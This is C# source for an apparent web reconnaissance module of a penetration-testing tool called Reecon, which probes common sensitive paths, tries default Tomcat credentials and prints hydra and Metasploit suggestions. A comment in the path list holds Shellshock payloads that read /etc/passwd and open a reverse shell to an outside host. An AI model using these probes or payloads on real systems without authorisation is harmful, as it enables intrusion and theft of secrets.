using Pastel;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.Json;
using System.Text.RegularExpressions;

namespace Reecon
{
    class Web
    {
        static readonly WebClient wc = new WebClient();
        static string url = "";
        public static void GetInfo(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Web Usage: reecon -web http://site.com/");
                return;
            }
            url = args[1];
            if (!url.StartsWith("http"))
            {
                Console.WriteLine("Invalid URL - Must start with http");
                return;
            }
            ScanPage(url);
            Console.WriteLine("Searching for common files...");

            // Used elsewhere so it can't just have its own output

            string commonFiles = FindCommonFiles(url);
            if (commonFiles.Trim() != "")
            {
                Console.WriteLine(commonFiles);
            }
            Console.WriteLine("Web Info Scan Finished");
        }

        private static void ScanPage(string url)
        {
            Console.WriteLine("Scanning...");
            var httpInfo = Web.GetHTTPInfo(url);
            string pageText = Web.GetHTTPInfo(url).PageText;
            string pageInfo = FindInfo(pageText);
            if (pageInfo.Trim() != "")
            {
                Console.WriteLine(pageInfo);
            }
            Console.WriteLine(FormatHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert, httpInfo.URL));
        }

        public static string FindInfo(string pageText, bool doubleDash = false)
        {
            string foundInfo = "";
            foundInfo += FindFormData(pageText);
            foundInfo += FindEmails(pageText, doubleDash);
            foundInfo += FindLinks(pageText, doubleDash);
            return foundInfo.Trim(Environment.NewLine.ToCharArray());
        }

        private static string FindFormData(string text)
        {
            // This is very hacky and will probably break
            // I can't just use the WebBrowser control since it's not cross-platform on devices with no GUI
            string returnText = "";
            if (text.Contains("<form"))
            {
                text = text.Remove(0, text.IndexOf("<form"));
                if (text.Contains("</form>"))
                {
                    returnText += "- Form Found" + Environment.NewLine;
                    text = text.Substring(0, text.IndexOf("</form>"));
                    List<string> formData = text.Split(Environment.NewLine.ToCharArray()).ToList();
                    foreach (string line in formData)
                    {
                        if (line.Trim().StartsWith("<form"))
                        {
                            string formHeader = line.Trim();
                            if (formHeader.Contains("action=\""))
                            {
                                string formAction = formHeader.Remove(0, formHeader.IndexOf("action=\"") + 8);
                                formAction = formAction.Substring(0, formAction.IndexOf("\""));
                                returnText += "-- Form Action: " + formAction + Environment.NewLine;
                            }
                            if (formHeader.Contains("method=\""))
                            {
                                string formMethod = formHeader.Remove(0, formHeader.IndexOf("method=\"") + 8);
                                formMethod = formMethod.Substring(0, formMethod.IndexOf("\""));
                                returnText += "-- Form Method: " + formMethod + Environment.NewLine;
                            }
                        }

                        // Bugs out if the input tag is spread over multiple lines
                        if (line.Trim().StartsWith("<input"))
                        {
                            string inputName = "";
                            string inputValue = "";
                            string inputLine = line.Trim(); ;
                            if (inputLine.Contains("name=\""))
                            {
                                inputName = inputLine.Remove(0, inputLine.IndexOf("name=\"") + 6);
                                inputName = inputName.Substring(0, inputName.IndexOf("\""));
                            }
                            if (inputLine.Contains("value=\""))
                            {
                                inputValue = inputLine.Remove(0, inputLine.IndexOf("value=\"") + 6);
                                inputValue = inputValue.Substring(0, inputValue.IndexOf("\""));
                            }
                            if (inputName != "")
                            {
                                returnText += "-- Input -> Name: " + inputName + (inputValue != "" ? ", Value: " + inputValue : "") + Environment.NewLine;
                            }
                        }

                        if (line.Trim().StartsWith("<button"))
                        {
                            returnText += "-- Button: " + line.Trim() + Environment.NewLine;
                        }
                    }
                }
            }
            return returnText;
        }

        private static string FindEmails(string text, bool doubleDash)
        {
            string returnInfo = "";

            // Do not change this Regex
            Regex emailRegex = new Regex(@"\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b", RegexOptions.IgnoreCase);
            MatchCollection emailMatches = emailRegex.Matches(text);
            List<string> matchList = General.MatchCollectionToList(emailMatches);
            foreach (string match in matchList)
            {
                if (doubleDash)
                {
                    returnInfo += "-- EMail: " + match + Environment.NewLine;
                }
                else
                {
                    returnInfo += "- EMail: " + match + Environment.NewLine;
                }
            }
            return returnInfo;
        }

        private static string FindLinks(string pageText, bool doubleDash)
        {
            string returnInfo = "";
            // Find all matches
            MatchCollection m1 = Regex.Matches(pageText, @"(<a.*?>.*?</a>)", RegexOptions.Singleline);

            // Loop over each match.
            foreach (Match m in m1)
            {
                string value = m.Groups[1].Value;
                string href = "";

                // Get href attribute.
                Match m2 = Regex.Match(value, @"href=\""(.*?)\""", RegexOptions.Singleline);
                if (m2.Success)
                {
                    href = m2.Groups[1].Value;
                }

                // Remove inner tags from text.
                string text = Regex.Replace(value, @"\s*<.*?>\s*", "", RegexOptions.Singleline);

                if (href.StartsWith("/"))
                {
                    if (url.EndsWith("/"))
                    {
                        href = url + href.TrimStart('/');
                    }
                }
                if (href.Length > 1)
                {
                    if (doubleDash)
                    {
                        returnInfo += "-- " + text + ": " + href + Environment.NewLine;
                    }
                    else
                    {
                        returnInfo += "- " + text + ": " + href + Environment.NewLine;
                    }
                }
            }
            return returnInfo.Trim(Environment.NewLine.ToCharArray());
        }

        public static string FindCommonFiles(string url)
        {
            string returnText = "";

            if (!url.EndsWith("/"))
            {
                url += "/";
            }

            // Wildcard test
            int notFoundLength = -1;
            int ignoreFolderLength = -1;
            string wildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed";
            bool ignoreRedirect = false;
            bool ignoreForbidden = false;
            bool ignoreBadRequest = false;

            // Testing Wildcards
            var pageResult = Web.GetHTTPInfo(wildcardURL);
            string pageResultText = pageResult.PageText;
            if (pageResult.StatusCode == HttpStatusCode.OK)
            {
                notFoundLength = pageResultText.Length;
                returnText += $"- Wildcard paths such as {wildcardURL} return - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
            {
                ignoreRedirect = true;
                returnText += $"- Wildcard paths such as {wildcardURL} redirect - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Forbidden)
            {
                ignoreForbidden = true;
                returnText += $"- Wildcard paths such as {wildcardURL} are forbidden - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.BadRequest)
            {
                ignoreBadRequest = true;
                returnText += $"- Wildcard paths such as {wildcardURL} return a bad request - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.NotFound)
            {
                notFoundLength = pageResultText.Length;
            }

            // PHP wildcards can be differnt
            bool ignorePHP = false;
            bool ignorePHPRedirect = false;
            string phpWildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed.php";
            pageResult = Web.GetHTTPInfo(phpWildcardURL);
            pageResultText = pageResult.PageText;
            if (pageResult.StatusCode == HttpStatusCode.OK)
            {
                ignorePHP = true;
                returnText += $"- .php wildcard paths such as {phpWildcardURL} return - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
            {
                ignorePHPRedirect = true;
                returnText += $"- .php wildcard paths such as {phpWildcardURL} redirect - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.NotFound)
            {
                notFoundLength = pageResultText.Length;
            }

            // Folder wildcards can also be different
            var folderWildcard = Web.GetHTTPInfo(url + "be0df04b-f5ff-4b4f-af99-00968cf08fed/");
            if (folderWildcard.StatusCode == HttpStatusCode.OK)
            {
                ignoreFolderLength = folderWildcard.PageText.Length;
            }

            // Mini gobuster :p
            List<string> commonFiles = new List<string>
            {
                // robots.txt - Of course
                "robots.txt",
                // Most likely invalid folder for test purposes
                "woof/",
                // Common hidden folders
                "hidden/",
                "secret/",
                "backup/",
                // Common Index files
                "index.php",
                "index.html",
                "index.jsp",
                // Common images folder
                "images/",
                // Hidden mail server
                "mail/",
                // Admin stuff
                "admin.php",
                "admin/",
                "manager/",
                // Git repo
                ".git/HEAD",
                // SSH
                ".ssh/id_rsa",
                // Bash History
                ".bash_history",
                // NodeJS Environment File
                ".env",
                // General info file
                ".DS_STORE",
                // Wordpress stuff
                "blog/",
                "wordpress/",
                "wordpress/wp-config.php.bak",
                "wp-config.php",
                "wp-config.php.bak",
                // phpmyadmin
                "phpmyadmin/",
                // Kibana
                "app/kibana",
                // Bolt CMS
                "bolt-public/img/bolt-logo.png",
                // Shellshock
                "cgi-bin/", // Test: curl -H "User-Agent: () { :;}; echo; /bin/cat /etc/passwd;" http://1.2.3.4/cgi-bin/valid.cgi
                           // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi
                // Well-Known
                ".well-known/", // https://www.google.com/.well-known/security.txt
                // Docker
                "version"
            };

            if (ignorePHP)
            {
                commonFiles.RemoveAll(x => x.EndsWith(".php"));
            }
            foreach (string file in commonFiles)
            {
                // Console.WriteLine("In Enum: " + file);
                string path = url + file;
                try
                {
                    var response = Web.GetHTTPInfo(path);
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        // Since it's readable - Let's deal with it!
                        try
                        {
                            string pageText = response.PageText;
                            if (pageText.Length != notFoundLength && (file.EndsWith("/") ? (pageText.Length != ignoreFolderLength ? true : false) : true))
                            {
                                returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Pastel(Color.Orange) + Environment.NewLine;
                                // Specific case for robots.txt since it's common and extra useful
                                if (file == "robots.txt")
                                {
                                    foreach (var line in pageText.Split(Environment.NewLine.ToCharArray()))
                                    {
                                        if (line != "")
                                        {
                                            returnText += "-- " + line + Environment.NewLine;
                                        }
                                    }
                                }
                                // Bolt
                                else if (file == "bolt-public/img/bolt-logo.png")
                                {
                                    returnText += "-- Bolt CMS!".Pastel(Color.Orange) + Environment.NewLine;
                                    returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
                                    returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
                                }
                                // Docker Engine
                                else if (file == "version" && pageText.Contains("Docker Engine - Community"))
                                {
                                    returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
                                    returnText += $"--- Run: docker -H tcp://iphere:portHere ps" + Environment.NewLine;
                                }
                                // Git repo!
                                else if (file == ".git/HEAD")
                                {
                                    returnText += "-- Git repo found!" + Environment.NewLine;

                                    // https://github.com/arthaud/git-dumper/issues/9
                                    WebClient wc = new WebClient();
                                    try
                                    {
                                        if (wc.DownloadString($"{url}.git/").Contains("../"))
                                        {
                                            // -q: Quiet (So the console doesn't get spammed)
                                            // -r: Download everything
                                            // -np: But don't go all the way backwards
                                            // -nH: So you only have the ".git" folder and not the IP folder as well
                                            returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
                                            returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                            // git log --pretty=format:"%h - %an (%ae): %s %b"
                                            returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                                            continue;
                                        }
                                    }
                                    catch { }
                                    returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
                                    returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                    returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                    returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                                }
                                // Kibana!
                                else if (file == "app/kibana")
                                {
                                    returnText += "-- Kibana!" + Environment.NewLine;
                                    try
                                    {
                                        WebClient wc = new WebClient();
                                        string toCheck = $"{url}{file}";
                                        string pageData = wc.DownloadString($"{url}{file}");
                                        if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
                                        {
                                            string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
                                            versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
                                            returnText += "--- Version: " + versionText + Environment.NewLine;
                                            returnText += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
                                        }
                                        else
                                        {
                                            returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                        }
                                    }
                                    catch
                                    {
                                        returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                    }
                                    returnText += $"--- Elasticsearch Console: {url}{file}#/dev_tools/console" + Environment.NewLine;
                                    returnText += "---- General Info: GET /" + Environment.NewLine;
                                    returnText += "---- Get Indices: GET /_cat/indices?v" + Environment.NewLine;
                                    // These aren't meant to be params
                                    returnText += "---- Get Index Info: GET /{index}/_search/?pretty&size={docs.count}" + Environment.NewLine;
                                }
                                else
                                {
                                    if (response.PageTitle.StartsWith("Index of /"))
                                    {
                                        returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
                                    }
                                    else
                                    {
                                        string usefulInfo = Web.FindInfo(pageText, true);
                                        if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
                                        {
                                            returnText += usefulInfo + Environment.NewLine;
                                        }
                                    }
                                }
                            }

                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Bug Reelix - HTTP.FindCommonFiles Error: " + ex.Message + Environment.NewLine);
                        }
                    }
                    else if (response.StatusCode == HttpStatusCode.BadRequest)
                    {
                        // Bad Request is still useful - Unless we're ignoring it
                        if (!ignoreBadRequest)
                        {
                            returnText += $"- Common Path is a Bad Request: {url}{file}" + Environment.NewLine;
                        }
                    }
                    else if (response.StatusCode == HttpStatusCode.Forbidden)
                    {
                        // Forbidden is still useful - Unless we're ignoring it
                        if (!ignoreForbidden)
                        {
                            returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
                        }
                    }
                    else if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.Moved)
                    {
                        if (ignoreRedirect)
                        {
                            continue;
                        }
                        if (file.EndsWith(".php") && ignorePHPRedirect)
                        {
                            continue;
                        }
                        returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
                        if (response.Headers != null && response.Headers.Get("Location") != null)
                        {
                            returnText += $"-- Redirection Location: {response.Headers.Get("Location")}" + Environment.NewLine;
                        }
                    }
                    else if (response.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
                        var headers = response.Headers;
                        if (headers.AllKeys.Any() && headers.Get("WWW-Authenticate") != null)
                        {
                            returnText += $"-- WWW-Authenticate: {headers.Get("WWW-Authenticate")}" + Environment.NewLine;
                        }
                        if (response.PageText != "")
                        {
                            returnText += $"-- Page Text: {response.PageText}" + Environment.NewLine;
                        }
                    }
                    else if (response.StatusCode == 0)
                    {
                        returnText += $"- " + "Host timed out - Unable to enumerate".Pastel(Color.Red);
                        break;
                    }
                    else if (response.StatusCode == HttpStatusCode.InternalServerError)
                    {
                        returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
                    }
                    else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.AllKeys.Contains("Docker-Distribution-Api-Version"))
                    {
                        string dockerVersion = response.Headers["Docker-Distribution-Api-Version"];
                        returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                        if (dockerVersion == "registry/2.0")
                        {
                            WebClient wc = new WebClient();
                            string repoText = wc.DownloadString($"{url}v2/_catalog");
                            if (repoText.Contains("repositories"))
                            {
                                try
                                {
                                    var repoList = JsonDocument.Parse(repoText);
                                    foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
                                    {
                                        returnText += "--- Repo Found: " + item  + Environment.NewLine;
                                        string tagList = wc.DownloadString($"{url}v2/" + item + "/tags/list");
                                        tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
                                        returnText += "---- Tags Found: " + tagList + Environment.NewLine;
                                        // /v2/cmnatic/myapp1/tags/list
                                        // --> /cmnatic/myapp1/manifests/notsecure
                                    }
                                    returnText += $"------> {url}v2/repo/app/manifests/tagnamehere";
                                    // Every notfound will be the same
                                    break;
                                }
                                catch
                                {
                                    returnText += "--- Unable to deserialize repo - Bug Reelix!" + Environment.NewLine;
                                    break;
                                }
                            }
                            returnText += repoText;
                        }
                        else
                        {
                            returnText += "-- Unknown Docker API Version - Bug Reelix!";
                        }
                    }
                    else if (response.StatusCode != HttpStatusCode.NotFound)
                    {
                        Console.WriteLine($"Unknown response for {file} - {response.StatusCode}");
                    }
                }
                catch (WebException ex)
                {
                    if (ex.Response != null)
                    {
                        HttpWebResponse response = (HttpWebResponse)ex.Response;
                        if (response.StatusCode == HttpStatusCode.OK)
                        {
                            returnText += $"- Common File exists: {url}{file}" + Environment.NewLine;
                            string pageText = new StreamReader(response.GetResponseStream()).ReadToEnd();
                            string usefulInfo = Web.FindInfo(pageText, true);
                            if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
                            {
                                returnText += usefulInfo + Environment.NewLine;
                            }
                        }
                    }
                    else
                    {
                        if (ex.Message.Trim().StartsWith("The remote name could not be resolved:"))
                        {
                            string message = ex.Message.Trim().Replace("The remote name could not be resolved:", "");
                            returnText += "- Hostname Found: " + message.Trim().Trim('\'') + " - You need to do a manual common file check" + Environment.NewLine;
                            return returnText;
                        }
                        else if (ex.Message == "The operation has timed out")
                        {
                            returnText += "- FindCommonFiles Timeout :<" + Environment.NewLine;
                        }
                        else
                        {
                            if (ex.Message != null)
                            {
                                Console.WriteLine("FindCommonFiles - Something weird happened: " + ex.Message);
                            }
                            else
                            {
                                Console.WriteLine("FindCommonFiles - Something REALLY weird happened - And it left no error message!");
                            }
                            return returnText;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("FindCommonFiles - Fatal Woof: " + ex.Message);
                }
            }
            return returnText.Trim(Environment.NewLine.ToArray());
        }

        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, WebHeaderCollection Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string userAgent = null, int timeoutMS = 30000)
        {
            string pageTitle = "";
            string pageText = "";
            string dns = "";
            HttpStatusCode statusCode = new HttpStatusCode();
            WebHeaderCollection headers = null;
            X509Certificate2 cert = null;
            // X509Certificate2 customCert = new CustomSSLCert();

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Timeout = timeoutMS;
            if (userAgent != null)
            {
                request.UserAgent = userAgent;
            }
            try
            {
                // Ignore invalid SSL Cert
                request.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) =>
                {
                    if (certificate != null)
                    {
                        cert = new X509Certificate2(certificate);
                    }
                    return true;
                };
                request.AllowAutoRedirect = false;

                // Can crash here due to a WebException on 401 Unauthorized / 403 Forbidden errors, so have to do some things twice
                request.Timeout = 5000;
                using (var response = request.GetResponse() as HttpWebResponse)
                {
                    statusCode = response.StatusCode;
                    dns = response.ResponseUri.DnsSafeHost;
                    headers = response.Headers;
                    using (StreamReader readStream = new StreamReader(response.GetResponseStream()))
                    {
                        pageText = readStream.ReadToEnd();
                    }
                    response.Close();
                }
            }
            catch (TimeoutException ex)
            {
                Console.WriteLine("Moo: " + ex.Message);
            }
            catch (WebException ex)
            {
                if (ex.Response == null)
                {
                    if (ex.Status == WebExceptionStatus.Timeout)
                    {
                        return (statusCode, null, null, null, null, null, url, "Timeout");
                    }
                    else if (ex.Message != null)
                    {
                        if (ex.Message.Trim() == "The request was aborted: Could not create SSL/TLS secure channel.")
                        {
                            Console.WriteLine("GetHTTPInfo.Error.SSLTLS - Bug Reelix to fix this");
                        }
                        else if (ex.Message.Trim() == "The underlying connection was closed: An unexpected error occurred on a send.")
                        {
                            Console.WriteLine("Legacy error - Bug Reelix!");
                        }
                        else if (ex.Message.Trim() == "The operation has timed out.")
                        {
                            Console.WriteLine("Legacy error - Bug Reelix!");
                        }
                        else if (ex.Message.Trim() == "Error: SecureChannelFailure (Authentication failed, see inner exception.)")
                        {
                            Console.WriteLine("Legacy error - Bug Reelix!");
                        }
                        else if (ex.Message.Trim() == "Error: ConnectFailure (Connection refused)" || ex.Message.Trim() == "Error: ConnectFailure (No route to host)")
                        {
                            Console.WriteLine("Legacy error - Bug Reelix!");
                        }
                        else if (ex.Message == "The SSL connection could not be established, see inner exception.")
                        {
                            return (statusCode, null, null, null, null, null, null, null);
                        }
                        else
                        {
                            Console.WriteLine("GetHTTPInfo.Error: " + ex.Message);
                        }
                    }
                    return (statusCode, null, null, null, null, null, url, null);
                }
                HttpWebResponse response = (HttpWebResponse)ex.Response;
                statusCode = response.StatusCode;
                dns = response.ResponseUri.DnsSafeHost;
                headers = response.Headers;
                using (StreamReader readStream = new StreamReader(response.GetResponseStream()))
                {
                    pageText = readStream.ReadToEnd();
                }
                response.Close();
            }
            catch (Exception ex)
            {
                // Something went really wrong...
                Console.WriteLine("GetHTTPInfo - Fatal Woof :( - " + ex.Message);
                return (statusCode, null, null, null, null, null, url, null);
            }

            if (pageText.Contains("<title>") && pageText.Contains("</title>"))
            {
                pageTitle = pageText.Remove(0, pageText.IndexOf("<title>") + "<title>".Length);
                pageTitle = pageTitle.Substring(0, pageTitle.IndexOf("</title>"));
            }
            if (request.ServicePoint.Certificate != null)
            {
                cert = new X509Certificate2(request.ServicePoint.Certificate);
            }
            return (statusCode, pageTitle, pageText, dns, headers, cert, url, null);
        }

        public static string FormatHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, WebHeaderCollection Headers, X509Certificate2 SSLCert, string URL)
        {
            string responseText = "";
            List<string> headerList = new List<string>();
            if (Headers != null)
            {
                headerList = Headers.AllKeys.ToList();
            }
            if (StatusCode != HttpStatusCode.OK)
            {
                // There's a low chance that it will return a StatusCode that is not in the HttpStatusCode list in which case (int)StatusCode will crash
                if (StatusCode == HttpStatusCode.MovedPermanently)
                {
                    if (Headers != null && Headers.Get("Location") != null)
                    {
                        responseText += "- Moved Permanently" + Environment.NewLine;
                        responseText += "-> Location: " + Headers.Get("Location") + Environment.NewLine;
                        headerList.Remove("Location");
                    }
                }
                else if (StatusCode == HttpStatusCode.Redirect)
                {
                    if (Headers != null && Headers.Get("Location") != null)
                    {
                        responseText += "- Redirect" + Environment.NewLine;
                        responseText += "-> Location: " + Headers.Get("Location") + Environment.NewLine;
                        headerList.Remove("Location");
                    }
                }
                else if (StatusCode == HttpStatusCode.NotFound)
                {
                    responseText += "- Base page is a 404" + Environment.NewLine;
                }
                else if (StatusCode != HttpStatusCode.OK)
                {
                    try
                    {
                        responseText += "- Weird Status Code: " + (int)StatusCode + " " + StatusCode + Environment.NewLine;
                    }
                    catch
                    {
                        responseText += "- Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                    }
                    if (Headers != null && Headers.Get("Location") != null)
                    {
                        responseText += "-> Location: " + Headers.Get("Location") + Environment.NewLine;
                        headerList.Remove("Location");
                    }
                }
            }
            if (!string.IsNullOrEmpty(PageTitle))
            {
                PageTitle = PageTitle.Trim();
                responseText += "- Page Title: " + PageTitle + Environment.NewLine;
                if (PageTitle.StartsWith("Apache Tomcat"))
                {
                    // CVE's
                    if (PageTitle == "Apache Tomcat/9.0.17")
                    {
                        responseText += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Pastel(Color.Orange);
                    }
                    // Apache Tomcat Page
                    NetworkCredential defaultTomcatCreds = new NetworkCredential("tomcat", "s3cret");

                    // Sanitize URL
                    if (!url.EndsWith("/"))
                    {
                        url += "/";
                    }

                    // Check Manager App
                    string managerAppURL = URL + "manager/html";
                    var managerAppInfo = Web.GetHTTPInfo(managerAppURL);
                    if (managerAppInfo.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        responseText += "- Manager App Found - But it requires credentials --> " + managerAppURL + Environment.NewLine;
                        try
                        {
                            WebClient wc = new WebClient();
                            wc.Credentials = defaultTomcatCreds;
                            wc.DownloadString(managerAppURL);
                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        catch
                        {
                            // Creds are still incorrect - Oh well
                        }
                    }
                    else if (managerAppInfo.StatusCode == HttpStatusCode.Forbidden)
                    {
                        responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
                    }
                    else if (managerAppInfo.StatusCode != HttpStatusCode.NotFound)
                    {
                        responseText += "Unknown Manager App Status Code: " + managerAppInfo.StatusCode + Environment.NewLine;
                    }

                    // Check Host Manager
                    string hostManagerURL = URL + "host-manager/html";
                    var hostManagerInfo = Web.GetHTTPInfo(hostManagerURL);
                    if (hostManagerInfo.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        responseText += "- Host Manager Found - But it requires credentials --> " + hostManagerURL + Environment.NewLine;
                        try
                        {
                            WebClient wc = new WebClient();
                            wc.Credentials = defaultTomcatCreds;
                            wc.DownloadString(hostManagerURL);
                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        catch
                        {
                            // Creds are still incorrect - Oh well
                        }
                    }
                    else if (hostManagerInfo.StatusCode == HttpStatusCode.Forbidden)
                    {
                        responseText += "- Host Manager Found - But it's Forbidden" + Environment.NewLine;
                    }
                    else if (hostManagerInfo.StatusCode != HttpStatusCode.NotFound)
                    {
                        responseText += "Unknown Host Manager Status Code: " + hostManagerInfo.StatusCode + Environment.NewLine;
                    }
                }
            }
            if (PageText.Length > 0)
            {
                if (PageText.Length < 250)
                {
                    responseText += "- Page Text: " + PageText.Trim() + Environment.NewLine;
                }

                // Wordpress
                if (PageText.Contains("/wp-content/themes/") && PageText.Contains("/wp-includes/"))
                {
                    responseText += "- Wordpress detected!".Pastel(Color.Orange) + Environment.NewLine;
                    // Basic User Enumeration
                    var wpUserTestOne = Web.GetHTTPInfo($"http://{DNS}/wp-json/wp/v2/users");
                    if (wpUserTestOne.StatusCode == HttpStatusCode.OK)
                    {
                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
                        foreach (JsonElement element in document.RootElement.EnumerateArray())
                        {
                            string wpUser = element.GetProperty("name").GetString();
                            responseText += ("-- Wordpress User Found: " + wpUser).Pastel(Color.Orange) + Environment.NewLine;
                        }
                    }
                    var wpUserTestTwo = Web.GetHTTPInfo($"http://{DNS}/index.php/wp-json/wp/v2/users");
                    if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
                    {
                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
                        foreach (JsonElement element in document.RootElement.EnumerateArray())
                        {
                            string wpUser = element.GetProperty("name").GetString();
                            responseText += ("-- Wordpress User Found: " + wpUser).Pastel(Color.Orange) + Environment.NewLine;
                        }
                    }

                    // 
                    var xmlrpc = GetHTTPInfo($"http://{DNS}/xmlrpc.php");
                    if (xmlrpc.PageText == "XML-RPC server accepts POST requests only.")
                    {
                        responseText += "-- xmlrpc.php found - Great for Brute Forcing!" + Environment.NewLine;
                    }

                    responseText += $"-- wpscan --url http://{DNS}/ --enumerate u1-5" + Environment.NewLine;
                    
                    // Checking for wp-login.php
                    var wplogin = GetHTTPInfo($"http://{DNS}/wp-login.php");
                    string wpLoginPath = "/blog/wp-login.php";
                    if (wplogin.StatusCode == HttpStatusCode.OK && wplogin.PageText.Contains("action=lostpassword"))
                    {
                        wpLoginPath = "/wp-login.php";
                    }
                    responseText += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
                }

                // Joomla!
                else if (PageText.Contains("com_content") && PageText.Contains("com_users"))
                {
                    responseText += "-- Joomla! Detected".Pastel(Color.Orange) + Environment.NewLine;
                    var adminXML = GetHTTPInfo($"http://{DNS}/administrator/manifests/files/joomla.xml");
                    if (adminXML.StatusCode == HttpStatusCode.OK)
                    {
                        if (adminXML.PageText.Contains("<version>") && adminXML.PageText.Contains("</version>"))
                        {
                            string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
                            versionText = versionText.Substring(0, versionText.IndexOf("</version"));
                            responseText += $"--- Joomla Version: {versionText}".Pastel(Color.Orange) + Environment.NewLine;
                        }
                    }
                    else
                    {
                        var tinyXML = GetHTTPInfo($"http://{DNS}/plugins/editors/tinymce/tinymce.xml");
                        if (tinyXML.StatusCode == HttpStatusCode.OK)
                        {
                            // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
                            responseText += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
                        }
                    }
                }
                // Icecast
                else if (PageText.Trim() == "<b>The source you requested could not be found.</b>")
                {
                    responseText += "-- Possible Icecast Server detected" + Environment.NewLine; // Thanks nmap!
                    responseText += "-- Try: run Metasploit windows/http/icecast_header" + Environment.NewLine;
                }
            }
            if (!string.IsNullOrEmpty(DNS))
            {
                responseText += "- DNS: " + DNS + Environment.NewLine;
            }
            // Headers!
            if (headerList.Any())
            {
                headerList = Headers.AllKeys.ToList();
                // Useful info
                if (headerList.Contains("Server"))
                {
                    headerList.Remove("Server");
                    string serverText = Headers.Get("Server").Trim();
                    responseText += "- Server: " + serverText + Environment.NewLine;
                    if (serverText.StartsWith("MiniServ/"))
                    {
                        responseText += "-- " + "Webmin Server Detected".Pastel(Color.Orange) + Environment.NewLine;
